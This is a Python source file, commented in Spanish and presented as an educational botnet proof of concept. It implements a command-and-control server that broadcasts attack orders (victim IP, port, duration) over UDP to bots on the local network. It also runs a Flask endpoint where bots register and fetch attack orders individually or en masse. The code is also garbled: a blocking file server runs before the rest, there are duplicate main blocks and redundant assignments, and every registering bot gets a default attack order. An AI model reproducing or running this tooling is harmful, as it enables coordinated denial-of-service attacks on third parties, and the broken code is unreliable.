#!/usr/bin/env python3
"""
C&C (Command and Control) - PoC educativa de botnet.

Envia una orden de ataque por UDP broadcast. Todos los bots de la red
local que esten escuchando la reciben y atacan a la vez.

Uso solo en un laboratorio aislado y controlado.
"""
import socket
import argparse
import http.server
import socketserver
from flask import Flask, request, jsonify


PORT = 8000

Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print("serving at port", PORT)
    httpd.serve_forever()

# Puerto donde los bots escuchan las ordenes del C&C
PUERTO_CC = 5000


def enviar_orden(ip_victima, puerto_victima, duracion):
    # Creamos un socket UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Habilitamos el envio por broadcast
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # La orden es un texto simple: "IP;PUERTO;DURACION"
    orden = f"{ip_victima};{puerto_victima};{duracion}"

    # 255.255.255.255 = broadcast a toda la red local
    s.sendto(orden.encode(), ("255.255.255.255", PUERTO_CC))
    s.close()

    print(f"[C&C] Orden enviada: atacar a {ip_victima}:{puerto_victima} durante {duracion}s")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="C&C de la botnet (PoC)")
    p.add_argument("ip", help="IP de la victima")
    p.add_argument("puerto", type=int, help="Puerto de la victima")
    p.add_argument("duracion", type=int, help="Duracion del ataque en segundos")
    args = p.parse_args()

    enviar_orden(args.ip, args.puerto, args.duracion)



app = Flask(__name__)

bots = {}                 # bots registrados: {bot_id: info}
ordenes_pendientes = {}   # orden por bot: {bot_id: {...}}

ordenes_pendientes = {}

ORDEN_POR_DEFECTO = { "tipo": "ataque", "parametros": { "ip": "x", "puerto": 80, "duracion": 2000 } }

@app.route("/registro", methods=["POST"])
def registro():
    datos = request.get_json()
    bot_id = datos["id"]
    bots[bot_id] = datos
    ordenes_pendientes[bot_id] = ORDEN_POR_DEFECTO   # ya le deja la orden al registrarse
    return jsonify({"ok": True})

@app.route("/ordenes/<bot_id>", methods=["GET"])
def ordenes(bot_id):
    orden = ordenes_pendientes.get(bot_id)
    ordenes_pendientes[bot_id] = None   # se la lleva y se borra
    return jsonify({"orden": orden})

@app.route("/nueva_orden", methods=["POST"])
def nueva_orden():
    datos = request.get_json()
    objetivo = datos.get("bot_id")      # un bot concreto, o...
    orden = datos["orden"]
    if objetivo:
        ordenes_pendientes[objetivo] = orden
    else:                                # ...para todos
        for b in bots:
            ordenes_pendientes[b] = orden
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
